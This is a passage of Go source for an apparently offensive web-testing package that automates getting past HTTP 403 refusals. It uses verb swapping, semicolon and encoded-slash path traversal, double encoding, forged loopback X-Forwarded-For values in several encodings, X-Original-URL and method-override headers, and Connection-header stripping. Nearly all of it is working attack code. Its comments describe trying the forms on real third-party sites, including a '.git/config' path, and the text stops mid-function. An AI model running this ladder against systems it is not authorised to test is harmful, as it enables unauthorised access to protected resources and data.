// Package bypass answers a resource the target refused.
//
// # What this is
//
// A `403` is the target's own answer, and it is the same answer whether the
// request was genuinely forbidden or whether it was refused because of the
// *shape* it arrived in. Almost every second answer is the second kind: an edge
// matches on the raw request line, the raw path, the header set or the protocol
// version, and anything it does not recognise it refuses — including the exact
// resource it would have served one layer down. This package walks those shapes.
//
// # Why it is a table and not a chain of conditionals
//
// The techniques are enumerated by eight independent projects, and they do not
// agree on anything except the outcome. A switch would grow a branch per
// project and would make "which shape do we try, and in what order" a fact
// buried in control flow. A table makes the order the contract: it is declared
// once, it is printable, and a test can assert on it.
//
// # Why the order is the contract
//
// Every form is a real request against a real target. That is the whole cost of
// this package and it is paid per refused response, so the order is
// cheapest-and-most-likely first, and a caller that has already learned which
// form worked for an origin gets to be told, not to re-walk.
//
// The order is not a guess. The verb forms come first because they change
// nothing about the request line's target and are the cheapest thing to try;
// the path forms come next because they are the PortSwigger technique and the
// one a servlet filter chain actually matches on; the header forms come after
// because they are how a reverse proxy decides who the request came from; and
// the protocol downgrade is last because it is the only one that cannot be
// expressed as an ordinary request at all.
package bypass

import (
	"net/http"
	"net/url"
	"strconv"
	"strings"

	"intruder/engine/pkg/intruder"
)

// Form is one way of asking for the same resource.
//
// Rewrite receives a clone of the request and returns the request to send. It
// returns false when the form does not apply to that request — a path form has
// no way to hide an extension in a URL that has none — and the driver skips it
// rather than sending a request that would only be a repeat of the original.
//
// The clone matters: a form that mutated its argument would corrupt the caller's
// request, and the caller keeps it to report what it eventually sent.
type Form struct {
	// Name is what the attempt record and the registry call this form. It is a
	// stable identifier, not a label: it appears in evidence, so renaming one
	// breaks every report that names it.
	Name string
	// Rewrite produces the alternative request.
	Rewrite func(*http.Request) (*http.Request, bool)
}

// Candidate is one concrete request a form produced for one particular URL.
//
// It is a value rather than a request so a caller can print the ladder without
// sending it, and so a test can assert on what would be asked before deciding
// whether to ask it.
type Candidate struct {
	// Form is the form's name.
	Form string
	// Method and URL are what would go on the wire.
	Method string
	URL    string
}

// Schemes to put on the wire.
//
// A plain `127.0.0.1` is what a loopback filter trusts and what a
// deny-by-default rule usually does not think to block, and both of those are
// properties of the *claim* rather than of the target — which is exactly why
// this is a bypass attempt and not a forgery: it says "I am a client on the same
// machine" and lets the target disagree.
const (
	forwardedForIP = "127.0.0.1"
	forwardedHost  = "localhost"
)

// methodTrack is written out rather than taken from `net/http`.
//
// The standard library has no constant for `TRACK`: it names the methods it
// implements, and `TRACK` is not one of them. A bypass ladder that skipped the
// verb because the standard library did not know it would be a ladder that only
// knows the methods Go happens to have a constant for.
const methodTrack = "TRACK"

// forwardingHeaders are the headers a reverse proxy reads to decide who the
// request came from, grouped by the claim each one makes.
//
// The group is deliberate. Sending one of them is a single guess about how this
// particular deployment is configured, and a deployment that reads one almost
// never reads the rest — so each is its own form rather than one form that sends
// all of them. A request carrying six invented identity headers is a request no
// real client sends, and a target that fingerprints that learns it is being
// bypassed, which is the opposite of the point.
var forwardingHeaders = []struct {
	// Name is the form's name.
	Name string
	// Header and Value are what the form sets.
	Header string
	Value  string
}{
	{Name: "header-forwarded-for", Header: "X-Forwarded-For", Value: forwardedForIP},
	{Name: "header-real-ip", Header: "X-Real-IP", Value: forwardedForIP},
	{Name: "header-client-ip", Header: "Client-IP", Value: forwardedForIP},
	{Name: "header-forwarded-host", Header: "X-Forwarded-Host", Value: forwardedHost},
	{Name: "header-forwarded-proto", Header: "X-Forwarded-Proto", Value: "https"},
	{Name: "header-remote-addr", Header: "X-Remote-Addr", Value: forwardedForIP},
	{Name: "header-rfc7239-forwarded", Header: "Forwarded", Value: "for=" + forwardedForIP},
}

// urlOverrideHeaders are the headers that name the resource the request is
// really for, and they are the ones a filter chain reads when it rewrites before
// it matches.
//
// They are separate from `forwardingHeaders` because they carry a *path*, not an
// identity: a value of `/admin` says "serve /admin", while `127.0.0.1` says "the
// client is local". The target reads the two with different code and a form that
// sent both at once would be asking two unrelated questions in one request.
var urlOverrideHeaders = []struct {
	Name   string
	Header string
}{
	{Name: "header-original-url", Header: "X-Original-URL"},
	{Name: "header-rewrite-url", Header: "X-Rewrite-URL"},
}

// FormNames lists every form the ladder would walk, in ladder order.
//
// # Why this reads `Ladder()` and not a table of its own
//
// A second list of names is a promise somebody has to keep. A form added to the
// ladder and forgotten here would be walkable by the engine and absent from the
// list the operator chooses from — a capability that exists, is reachable, and is
// not offered. That is the same shape of defect the reconciliation register exists
// to catch, and it is cheaper to not create than to catch: one source, read.
//
// Order comes out of this too, because it comes out of the same slice. The ladder
// is ordered by how likely a shape is to be what an edge checks, and an operator
// reading a list needs to see that order to know what they are switching on — a
// sorted list would hide exactly the thing worth knowing.
func FormNames() []string {
	ladder := Ladder()
	names := make([]string, 0, len(ladder))
	for _, form := range ladder {
		names = append(names, form.Name)
	}
	return names
}

// Ladder is the ordered set of forms.
//
// It is a function rather than a package variable so a caller cannot mutate the
// shared slice, and so a test that appends to a copy cannot change what the next
// caller walks.
func Ladder() []Form {
	ladder := make([]Form, 0, 24)

	// Verbs first: they leave the target, the path and the query alone, so a
	// deployment that gates on the method answers one of these without ever
	// looking at anything else in the request.
	ladder = append(ladder,
		verbForm("verb-post", http.MethodPost, true),
		verbForm("verb-head", http.MethodHead, false),
		verbForm("verb-options", http.MethodOptions, false),
		verbForm("verb-delete", http.MethodDelete, false),
		verbForm("verb-track", methodTrack, false),
		verbForm("verb-put", http.MethodPut, true),
	)

	// Path forms. Each hides the last segment's extension or the segment itself
	// from a filter that matches on the raw URI. `pathForms` already ends with the
	// segment family, so appending `segmentForms` here as well would put sixteen
	// forms in the ladder under sixteen duplicate names — which the uniqueness
	// test caught before the walk ever ran.
	ladder = append(ladder, pathForms()...)
	ladder = append(ladder, pathSegmentLeadForm())
	ladder = append(ladder, pathTraversalForms()...)
	ladder = append(ladder, pathTraversalLeadForm())
	ladder = append(ladder, encodedSlashTraversalForms()...)

	// Header forms, after the path forms because a path form changes what is
	// being asked for while a header form only changes who is asking.
	for _, header := range forwardingHeaders {
		ladder = append(ladder, headerForm(header.Name, header.Header, header.Value))
	}
	for _, override := range urlOverrideHeaders {
		ladder = append(ladder, urlOverrideForm(override.Name, override.Header))
	}
	ladder = append(ladder, refererSelfForm())
	ladder = append(ladder, loopbackEncodingForms()...)
	ladder = append(ladder, methodOverrideForms()...)

	// `ConnectionStrippingForms` is deliberately NOT added here. Measured
	// 2026-10-03 against `tass.ru` and then against an HTTP/2 fixture: Go's h2
	// client refuses the request outright — `http2: invalid Connection request
	// header` — and HTTP/2 forbids the header entirely, so the technique is not
	// one that "failed to bypass here" but one this client cannot send at all on
	// any h2 target, which is most of them. Four requests per refusal that cannot
	// produce an answer is exactly the hidden cost the project's rule about
	// visible limits exists to prevent. It is exported instead, so a caller that
	// knows it is speaking HTTP/1.1 can ask for it by name in `BypassForms`.
	// The measurement lives in `http2_limit_test.go`.

	return ladder
}

// loopbackForms are the ways a loopback address is written that are not
// `127.0.0.1`.
//
// Four of the eight upstreams send a set of these — `yunemse48` crosses sixteen
// of them with eight headers, `devploit` sends eight against five headers,
// `kira2040k` sends one value pair — and the reason is not evasiveness: an access
// rule that matches the *string* `127.0.0.1` is a rule that does not read the
// address, and `0177.0.0.1` is the same address to a parser that decodes octal.
// A target that resolves the address and compares it numerically refuses none of
// them, which is the honest limit of this family and why it is six forms rather
// than sixteen.
var loopbackForms = []struct {
	// Name is the form's name.
	Name string
	// Value is the address as written.
	Value string
}{
	{Name: "header-loopback-short", Value: "127.1"},
	{Name: "header-loopback-octal", Value: "0177.0.0.1"},
	{Name: "header-loopback-hex", Value: "0x7f.0x0.0x0.0x1"},
	{Name: "header-loopback-decimal", Value: "2130706433"},
	{Name: "header-loopback-ipv6", Value: "[::1]"},
	{Name: "header-loopback-mapped", Value: "::ffff:127.0.0.1"},
}

// loopbackIPHeader is the header the encoded forms speak through.
//
// It is `X-Forwarded-For` because that is the one every upstream sends and the
// one a proxy actually reads. Sending each encoding through a different header
// would be sixteen requests to ask the same question, and the answers would not
// be comparable.
const loopbackIPHeader = "X-Forwarded-For"

// loopbackEncodingForms is one form per way of writing the loopback address.
func loopbackEncodingForms() []Form {
	forms := make([]Form, 0, len(loopbackForms))
	for _, encoding := range loopbackForms {
		encoding := encoding
		forms = append(forms, Form{
			Name: encoding.Name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				out := cloneRequest(req)
				out.Header.Set(loopbackIPHeader, encoding.Value)
				return out, true
			},
		})
	}
	return forms
}

// ConnectionStrippingForms ask a proxy to remove the very header being sent.
//
// `devploit/nomore403` sends the identity header *and* names it in `Connection`,
// which a compliant proxy must strip before forwarding. The request that reaches
// the origin therefore carries no `X-Forwarded-For` at all — which is a different
// request from the one that carries a loopback address, and it is the one that
// reaches an origin behind a proxy that trusts nothing it was told.
//
// # It is exported rather than walked, and that is a measured decision
//
// HTTP/2 forbids the `Connection` header outright: it is hop-by-hop and has no
// meaning where a connection is multiplexed. Go's h2 client therefore refuses the
// request before writing it — `http2: invalid Connection request header` — which
// is what `TestTheStripFormsCannotBeSentOverHTTP2` records.
//
// So the form's mechanism is the very thing the protocol refuses. It is not "a
// technique that did not bypass here"; it is a request this client cannot send on
// any HTTP/2 target, and HTTP/2 is what most targets negotiate. Walking four of
// them on every refusal would spend four requests that cannot produce an answer,
// which is the hidden cost the project rule about visible limits exists to
// prevent — so `Ladder()` leaves them out and the cost is zero by default.
//
// They stay reachable for a caller that knows it is on HTTP/1.1 — an origin
// without ALPN, a plugin whose own client speaks 1.1 — by naming them in
// `BypassForms`. Nothing is lost; the default simply stops spending on a form
// that cannot go out.
//
// It is documented this way because it looks like a bug otherwise: a reader who
// does not know the technique reads `Connection: X-Forwarded-For` as a typo.
func ConnectionStrippingForms() []Form {
	targets := []struct {
		Name   string
		Header string
	}{
		{Name: "strip-x-forwarded-for", Header: "X-Forwarded-For"},
		{Name: "strip-x-real-ip", Header: "X-Real-IP"},
		{Name: "strip-x-original-url", Header: "X-Original-URL"},
		{Name: "strip-x-rewrite-url", Header: "X-Rewrite-URL"},
	}
	forms := make([]Form, 0, len(targets))
	for _, target := range targets {
		target := target
		forms = append(forms, Form{
			Name: target.Name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				out := cloneRequest(req)
				out.Header.Set("Connection", "close, "+target.Header)
				return out, true
			},
		})
	}
	return forms
}

// methodOverrideForms change the verb the request declares without changing the
// verb on the request line.
//
// A framework or proxy that reads the real method and a filter chain that reads
// the one on the request line are asking two different questions, and the gap
// between them is where this technique lives. `devploit/nomore403` sends all
// three channels — a `_method` field in the query, in the body, and in three
// headers; this package sends the header channel only, because the other two are
// a question about the *application's* parameter parsing rather than about the
// edge that refused the request, and answering that belongs to the probe that
// already fires application parameters.
func methodOverrideForms() []Form {
	headers := []struct {
		Name   string
		Header string
	}{
		{Name: "method-override-http", Header: "X-HTTP-Method-Override"},
		{Name: "method-override-short", Header: "X-Method-Override"},
	}
	forms := make([]Form, 0, len(headers))
	for _, override := range headers {
		override := override
		forms = append(forms, Form{
			Name: override.Name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				if req.Method == http.MethodPost {
					// The technique is a `GET` that declares itself a `POST`. On a
					// request that already is one there is nothing to override, and
					// sending the header anyway would be a form asking a question it
					// has already answered.
					return nil, false
				}
				out := cloneRequest(req)
				out.Header.Set(override.Header, http.MethodPost)
				return out, true
			},
		})
	}
	return forms
}

// verbForm swaps the method and, when `body` is set, gives the new method a
// body of its own.
//
// The body is the part that is easy to leave out and the reason the technique
// exists at all: a filter that gates `GET` and lets `POST` through reads the
// `Content-Length` the new method needs to be considered well-formed, and a
// `POST` with no body is a request the server may reject before the filter
// chain is reached at all.
func verbForm(name, method string, body bool) Form {
	return Form{
		Name: name,
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			if req.Method == method {
				return nil, false
			}
			out := cloneRequest(req)
			out.Method = method
			if body {
				out.Body = http.NoBody
				out.ContentLength = 0
				// A method change leaves `GET`'s query on the URL, which is where
				// it belongs for every method. A form that dropped it would be
				// asking a different question.
				out.URL = cloneURL(req.URL)
			}
			return out, true
		},
	}
}

// pathForms are the shapes that hide a resource from a filter matching the end of
// the raw URI.
//
// They are the PortSwigger technique and the reason `path-semicolon-extension`
// is not a new idea here: `AuthBypassExt` in the active scanner already fires
// the `;.ext` form against a server-side extension. That detector reports
// whether a *protected* resource was reached; this package reaches the resource
// at all. The two answer different questions about the same request and the
// detector's forms are not repeated here.
func pathForms() []Form {
	forms := []Form{
		{
			Name: "path-semicolon",
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				// A trailing `;` is a path parameter with an empty name, and a
				// filter that compares the path to a string stops matching it.
				return rewritePath(req, func(path string) (string, bool) {
					trimmed := strings.TrimSuffix(path, "/")
					if trimmed == "" {
						return "", false
					}
					return trimmed + ";/", true
				})
			},
		},
		{
			Name: "path-trailing-slash",
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				return rewritePath(req, func(path string) (string, bool) {
					if strings.HasSuffix(path, "/") {
						return "", false
					}
					return path + "/", true
				})
			},
		},
		{
			Name: "path-dot-segment",
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				// `/./` is normalised by a server that resolves dot segments before
				// it matches, and left alone by one that does not. Which of the two
				// the target is decides whether this is a bypass or a different URL.
				return rewritePath(req, func(path string) (string, bool) {
					trimmed := strings.TrimSuffix(path, "/")
					if trimmed == "" || strings.HasSuffix(trimmed, "/.") {
						return "", false
					}
					return trimmed + "/./", true
				})
			},
		},
		{
			Name: "path-dot-dot-semicolon",
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				// The traversal form, which reaches a resource when the target
				// normalises `..` before it matches but not when it normalises
				// after.
				return rewritePath(req, func(path string) (string, bool) {
					trimmed := strings.TrimSuffix(path, "/")
					if trimmed == "" || strings.HasSuffix(trimmed, "..;") {
						return "", false
					}
					return trimmed + "..;/", true
				})
			},
		},
		{
			Name: "path-encoded-semicolon",
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				// The same character encoded, which reaches a resource when the
				// filter matches before decoding.
				//
				// `RawPath` is what carries it, and it is the whole difficulty:
				// `URL.String()` escapes a `%` in `Path` back to `%25`, so a form
				// that set only `Path` would send a doubly encoded separator and
				// appear to do nothing. `Path` holds the decoded form and `RawPath`
				// the encoded one, and `EscapedPath` prefers the second precisely
				// when it decodes to the first.
				if req.URL == nil {
					return nil, false
				}
				trimmed := strings.TrimSuffix(req.URL.Path, "/")
				if trimmed == "" {
					return nil, false
				}
				target := cloneURL(req.URL)
				target.Path = trimmed + ";"
				target.RawPath = trimmed + "%3b"
				out := cloneRequest(req)
				out.URL = target
				return out, true
			},
		},
		{
			Name: "path-trailing-dot",
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				return rewritePath(req, func(path string) (string, bool) {
					if strings.HasSuffix(path, ".") {
						return "", false
					}
					return path + ".", true
				})
			},
		},
	}

	// The encoded form, twice. It is here rather than written out because the
	// project's own payload encoder already knows what a second round of URL
	// encoding does, and a bypass that encoded differently from the Intruder
	// would be two answers to "what does double-encoding produce here".
	//
	// As with the encoded separator, `Path` carries the decoded form and
	// `RawPath` the encoded one. Writing the encoded text into `Path` would have
	// `String()` escape it again and send `%2525`, which is a fourth encoding
	// rather than a second.
	forms = append(forms, Form{
		Name: "path-double-encoded",
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			if req.URL == nil {
				return nil, false
			}
			target := cloneURL(req.URL)
			// The leading `/` stays a separator and only the rest is encoded.
			// `QueryEscape` escapes `/` along with everything else, so encoding
			// the whole path produced a request target with no leading slash at
			// all — which a server answers 400, and which this package would then
			// have reported as a form that reached the resource. A malformed
			// request is a refusal of the shape, not access to the page.
			encoded, err := intruder.TransformPayload(
				strings.TrimPrefix(target.Path, "/"), doubleEncode())
			if err != nil {
				return nil, false
			}
			encoded = "/" + encoded
			decoded, err := url.PathUnescape(encoded)
			if err != nil {
				return nil, false
			}
			target.Path = decoded
			target.RawPath = encoded
			out := cloneRequest(req)
			out.URL = target
			return out, true
		},
	})

	// One form per segment, each hiding a different segment behind `..;`.
	//
	// This is the permutation the PortSwigger extension performs, and it is a
	// family rather than a single form because the answer depends on which
	// segment the filter normalises. One request per segment, in order, because
	// each of them is a request to a real target.
	return append(forms, segmentForms()...)
}

// segmentForms builds one form per path segment, at ladder build time, so the
// number of forms is a property of the URL rather than of a constant.
func segmentForms() []Form {
	forms := make([]Form, 0, len(segmentFormNames))
	for position, name := range segmentFormNames {
		position, name := position, name
		forms = append(forms, Form{
			Name: name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				return rewriteSegmentsAt(req, position, segmentBeforeSlash)
			},
		})
	}
	return append(forms, segmentAfterForms()...)
}

// pathSegmentLeadForm hides the *first* segment behind the traversal form.
//
// It is the one position the PortSwigger extension walks that is not a segment
// form: the trick lands in front of the first segment instead of inside it
// (`403Bypasser.py:239`).
//
// # It keeps the leading separator, and that is a measured correction
//
// The extension's other position (`403Bypasser.py:233`) puts the trick *before*
// the leading separator, producing a request target that starts with `..;` rather
// than `/`. Measured here on 2026-10-03: that request cannot be sent from this
// client. `url.URL.String()` writes a separator in front of a relative path, so
// the logged URL looks correct, while `url.URL.RequestURI()` — which is what
// `Request.write` actually puts on the wire — does not. The target goes out as
// `..;/one/...`, the leading separator is missing, and every server answers 400.
//
// 400 is a refusal, so a walk counted this as a shape that reached nothing — but
// the honest cause is narrower: the form is not expressible through
// `net/http`, not that the technique failed. The separator is therefore kept, so
// the form sends `/..;/one/...`, and the separator-less variant is recorded as
// not-ported with this measurement behind it.
func pathSegmentLeadForm() Form {
	return Form{
		Name: "path-segment-lead",
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			target := cloneURL(req.URL)
			trimmed := strings.TrimPrefix(target.Path, "/")
			if trimmed == "" {
				// The trick in front of the root is a root with a prefix the
				// server normalises away, so it asks nothing the plain request
				// did not already ask.
				return nil, false
			}
			target.Path = "/" + segmentTrick + trimmed
			target.RawPath = ""
			out := cloneRequest(req)
			out.URL = target
			return out, true
		},
	}
}

// encodedSlashTrick is a traversal whose separator is written as `%2f`.
//
// # Why it exists, and it is not the same form as `/../`
//
// Measured 2026-10-04 on `www.liveinternet.ru/.git/config`. The plain answer is
// `403`. This port's literal-traversal forms were measured on it too, and all of
// them were refused:
//
//	/.git/../config   → 404
//	/.git/config/..   → 403
//	/../.git/config   → 400
//
// The original tool's nine hits on this same host were `/../..%2f..%2f` and its
// siblings — the same traversal with the **separator encoded**. That is a
// different request: the path is not a traversal to a server that resolves one,
// it is a literal segment to a server that decodes late. Carrying only `/../`
// would have carried the wrong form of the technique, which is what "the register
// lists a capability" is supposed to prevent and did not.
//
// # How it reaches the wire, which is the whole difficulty
//
// Go's `url.URL` will only use `RawPath` when `unescape(RawPath) == Path`. Writing
// `%2f` into both fields therefore fails the check and `String()` falls back to
// escaping `Path` — producing `%252f`, a request for a file literally named
// `..%2f`. Measured 2026-10-04, and the mistake was mine: the code said it avoided
// exactly that and produced it.
//
// So the two fields carry different strings on purpose: `Path` carries the
// **decoded** traversal and `RawPath` carries the **encoded** one. Then the check
// holds, `EscapedPath()` returns `RawPath`, and the wire receives `..%2f` — which
// is the upstream request.
const encodedSlashTrick = "..%2f"

// encodedSlashFormNames is the literal list of the encoded-separator forms.
var encodedSlashFormNames = []string{
	"encoded-traversal-1",
	"encoded-traversal-2",
	"encoded-traversal-3",
	"encoded-traversal-4",
	"encoded-traversal-5",
	"encoded-traversal-6",
	"encoded-traversal-7",
	"encoded-traversal-8",
}

// encodedSlashTraversalForms builds one `%2f` form per segment boundary.
func encodedSlashTraversalForms() []Form {
	forms := make([]Form, 0, len(encodedSlashFormNames))
	for position, name := range encodedSlashFormNames {
		position, name := position, name
		forms = append(forms, Form{
			Name: name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				target := cloneURL(req.URL)
				segments := splitPath(target.Path)
				if position < 0 || position >= len(segments) {
					return nil, false
				}
				segments[position] = segments[position] + "/" + encodedSlashTrick
				// `Path` gets the decoded string and `RawPath` the encoded one.
				// `url.URL` only trusts `RawPath` when `unescape(RawPath) == Path`,
				// so putting `%2f` in both would fall back to escaping and produce
				// `%252f` — a file literally named `..%2f`, which is not the
				// request the technique is about.
				encoded := "/" + strings.Join(segments, "/")
				decoded, err := url.PathUnescape(encoded)
				if err != nil {
					// The path could not be decoded, so no pair satisfies the
					// check and any answer would be `%252f`. Refuse rather than
					// send a request for a name nobody meant.
					return nil, false
				}
				target.Path = decoded
				target.RawPath = encoded
				out := cloneRequest(req)
				out.URL = target
				return out, true
			},
		})
	}
	return forms
}

// segmentTrick is what hides a segment from a filter that normalises it.
const segmentTrick = "..;"

// pathTraversalNames is the literal list of the `/../` forms.
//
// # Why these exist, measured rather than assumed
//
// Measured 2026-10-03 on `www.liveinternet.ru/.git/config`, whose plain answer
// is `403` from nginx while the same host serves `/robots.txt` with `200`:
// appending `/../` repeatedly turns the refusal into **`200`**. The body that
// comes back is the site's home page, not the file — nginx resolves the traversal
// to the root — but the server *answered*, which is the whole difference between a
// refusal and a response.
//
// That is the one form on this target that produced a change, and this port did
// not carry it: `/../` was filed under the extension-suffix and mid-path rows as
// not-ported and never got a row of its own, which is exactly the loss the
// register is supposed to prevent. So it is carried now.
//
// The false positive it invites is handled by the driver, not here: see
// `sameSiteRoot`. Reporting a traversal-to-root as "reached the file" is what the
// original tool did on this very target, and its own statistics contradicted its
// own conclusion while it did it.
var pathTraversalNames = []string{
	"path-traversal-1",
	"path-traversal-2",
	"path-traversal-3",
	"path-traversal-4",
	"path-traversal-5",
	"path-traversal-6",
	"path-traversal-7",
	"path-traversal-8",
}

// pathTraversalForms builds one `/../` form per segment boundary.
func pathTraversalForms() []Form {
	forms := make([]Form, 0, len(pathTraversalNames))
	for position, name := range pathTraversalNames {
		position, name := position, name
		forms = append(forms, Form{
			Name: name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				target := cloneURL(req.URL)
				segments := splitPath(target.Path)
				if position < 0 || position >= len(segments) {
					return nil, false
				}
				segments[position] = segments[position] + "/.."
				target.Path = "/" + strings.Join(segments, "/")
				target.RawPath = ""
				out := cloneRequest(req)
				out.URL = target
				return out, true
			},
		})
	}
	return forms
}

// pathTraversalLeadForm puts `/../` in front of the path, which is the shortest
// way to ask for the root and the form the original tool's payload list is built
// around.
func pathTraversalLeadForm() Form {
	return Form{
		Name: "path-traversal-lead",
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			target := cloneURL(req.URL)
			trimmed := strings.TrimPrefix(target.Path, "/")
			if trimmed == "" {
				return nil, false
			}
			target.Path = "/../" + trimmed
			target.RawPath = ""
			out := cloneRequest(req)
			out.URL = target
			return out, true
		},
	}
}

// segmentAfterFormNames is the literal list of the after-slash segment forms.
//
// They exist because the original was measured producing **11** distinct requests
// for a three-segment path (`403Bypasser.py:229-251`: three insertion points per
// boundary, of which "between slashes" duplicates "after slash", plus two
// trailing). One form per position is only the first of the two shapes that
// position yields: `/api..;/v1` and `/api/..;/v1` are different requests, and a
// filter that hides the segment by matching `;` inside it treats them differently.
var segmentAfterFormNames = []string{
	"path-segment-after-1",
	"path-segment-after-2",
	"path-segment-after-3",
	"path-segment-after-4",
	"path-segment-after-5",
	"path-segment-after-6",
	"path-segment-after-7",
	"path-segment-after-8",
}

// segmentAfterForms builds the after-slash half of the segment family.
func segmentAfterForms() []Form {
	forms := make([]Form, 0, len(segmentAfterFormNames))
	for position, name := range segmentAfterFormNames {
		position, name := position, name
		forms = append(forms, Form{
			Name: name,
			Rewrite: func(req *http.Request) (*http.Request, bool) {
				return rewriteSegmentsAt(req, position, segmentAfterSlash)
			},
		})
	}
	return forms
}

// segmentPlacement is where inside the path the traversal form lands.
type segmentPlacement int

const (
	// segmentBeforeSlash appends the trick to the segment, so the separator that
	// follows carries it: `/api..;/v1`.
	segmentBeforeSlash segmentPlacement = iota
	// segmentAfterSlash puts the separator before the trick, producing an empty
	// segment: `/api/..;/v1`.
	segmentAfterSlash
)

// rewriteSegmentsAt hides the segment at `position` using the given placement.
func rewriteSegmentsAt(req *http.Request, position int, where segmentPlacement) (*http.Request, bool) {
	target := cloneURL(req.URL)
	segments := splitPath(target.Path)
	if position < 0 || position >= len(segments) {
		return nil, false
	}
	switch where {
	case segmentBeforeSlash:
		segments[position] = segments[position] + segmentTrick
	case segmentAfterSlash:
		segments[position] = segments[position] + "/" + segmentTrick
	}
	target.Path = "/" + strings.Join(segments, "/")
	target.RawPath = ""
	out := cloneRequest(req)
	out.URL = target
	return out, true
}

// segmentFormNames is the literal list of the segment forms.
//
// The names are written out rather than computed, and that is the whole point of
// the list. A generated name produces the same string at runtime and leaves
// nothing to read: a report names `path-segment-3`, a reader greps for it, and
// the search finds nothing. The registry's symbol check caught exactly that,
// which is what it is for. A form whose name exists only at runtime cannot be
// found, cited, or reviewed.
var segmentFormNames = []string{
	"path-segment-1",
	"path-segment-2",
	"path-segment-3",
	"path-segment-4",
	"path-segment-5",
	"path-segment-6",
	"path-segment-7",
	"path-segment-8",
}

// segmentFormName is the form's name for one segment position.
//
// The name carries the position so an attempt record says *which* segment was
// hidden, which is the whole difference between a report an analyst can act on
// and one that says "a path form worked".
//
// Past the fixed ladder the name is built rather than looked up, and that is the
// point: the ladder's own names are literal so they can be grepped and cited,
// while a caller asking about position 900 still gets an answer instead of an
// empty string. An empty name is the one value that cannot be acted on, so it is
// never returned for a position at all — only for a negative one, which cannot
// come from a segment index.
func segmentFormName(position int) string {
	if position < 0 {
		return ""
	}
	if position < len(segmentFormNames) {
		return segmentFormNames[position]
	}
	return "path-segment-" + strconv.Itoa(position+1)
}

// segmentPositionLimit is how many segment forms the ladder carries.
//
// Eight is not a limit on what a target can have: it is the count of forms this
// package is willing to send before it has already learned something. A path
// with more segments than this is still walked, segment by segment, by the
// caller that learns from the first few — see `Candidates`, which walks every
// position of the URL it is given regardless of this constant.
const segmentPositionLimit = 8

// A position past the end of the path is not a bypass, it is a different URL, so
// `rewriteSegmentsAt` refuses it rather than clamping — which is why this note
// used to live on `rewriteSegments` and now lives on the one function that does
// the work.

// splitPath is the path's segments, without the empty ones a leading or doubled
// `/` produces.
func splitPath(path string) []string {
	out := make([]string, 0, 8)
	for _, segment := range strings.Split(path, "/") {
		if segment != "" {
			out = append(out, segment)
		}
	}
	return out
}

// headerForm adds one header and changes nothing else.
func headerForm(name, header, value string) Form {
	return Form{
		Name: name,
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			out := cloneRequest(req)
			out.Header.Set(header, value)
			return out, true
		},
	}
}

// urlOverrideForm adds the header that names the resource the request is really
// for, with this request's own path as the value.
//
// The value is computed from the request rather than written into the table
// because the table is built once and the path is not known then. A form that
// sent a constant would name the same path for every target it was tried on,
// which is a request no filter would believe.
func urlOverrideForm(name, header string) Form {
	return Form{
		Name: name,
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			out := cloneRequest(req)
			out.Header.Set(header, req.URL.RequestURI())
			return out, true
		},
	}
}

// refererSelfForm points `Referer` at the page being asked for.
//
// A target that gates a path by whether the request claims to have come from
// somewhere else is answering a question about a header the original request
// left empty.
func refererSelfForm() Form {
	return Form{
		Name: "header-referer-self",
		Rewrite: func(req *http.Request) (*http.Request, bool) {
			if req.Referer() != "" {
				return nil, false
			}
			out := cloneRequest(req)
			out.Header.Set("Referer", req.URL.String())
			return out, true
		},
	}
}

// rewritePath is the shape every path form has: take the path, hand it to a rule,
// and refuse the request when the rule refuses.
//
// It re-serialises `RawPath` deliberately. `url.URL.EscapedPath()` returns
// `RawPath` only when it is a valid encoding *of* `Path`, and a path a form
// changed is no longer the encoding of anything Go knows about — so leaving
// `RawPath` set would send the old path and the form would appear to do nothing.
func rewritePath(req *http.Request, rule func(string) (string, bool)) (*http.Request, bool) {
	if req.URL == nil {
		return nil, false
	}
	target := cloneURL(req.URL)
	rewritten, ok := rule(target.Path)
	if !ok || rewritten == target.Path {
		return nil, false
	}
	target.Path = rewritten
	target.RawPath = ""
	out := cloneRequest(req)
	out.URL = target
	return out, true
}

// doubleEncode is the operation chain the project's own payload encoder applies
// twice, named once so the bypass and the Intruder cannot drift apart.
func doubleEncode() []intruder.Transform {
	return []intruder.Transform{{Operation: "urlEncode"}, {Operation: "urlEncode"}}
}

// cloneRequest copies a request far enough that a form can change its method, URL
// and headers without the caller seeing it.
//
// The body is shared rather than re-created: `GetBody` is what makes a retry
// possible at all, and re-reading a body that cannot be rewound would make every
// form after the first a request with no body, which is a different question
// from the one the form is asking.
func cloneRequest(req *http.Request) *http.Request {
	out := req.Clone(req.Context())
	out.Header = req.Header.Clone()
	if out.Header == nil {
		out.Header = make(http.Header)
	}
	return out
}

// cloneURL copies a URL. `url.URL` is a value with one pointer inside it, so
// copying the struct alone would leave both copies sharing one `Userinfo`.
func cloneURL(in *url.URL) *url.URL {
	if in == nil {
		return nil
	}
	out := *in
	if in.User != nil {
		user := *in.User
		out.User = &user
	}
	return &out
}

// Candidates is the ladder as a list of requests, for one request and one
// selection of forms.
//
// It walks every segment of the URL it is given, which is not the same as the
// fixed number of segment forms the ladder carries: the ladder is what this
// package will *try*, and this is what a caller can *see* before deciding. The
// two agree up to `segmentPositionLimit` and diverge above it, and the caller
// that wants more positions asks for them here.
func Candidates(req *http.Request, enabled []string) []Candidate {
	if req == nil || req.URL == nil {
		return nil
	}
	allow := toSet(enabled)
	out := make([]Candidate, 0, 32)
	for _, form := range Ladder() {
		if allow != nil && !allow[form.Name] {
			continue
		}
		if rewritten, ok := form.Rewrite(req); ok {
			out = append(out, Candidate{
				Form:   form.Name,
				Method: rewritten.Method,
				URL:    rewritten.URL.String(),
			})
		}
	}
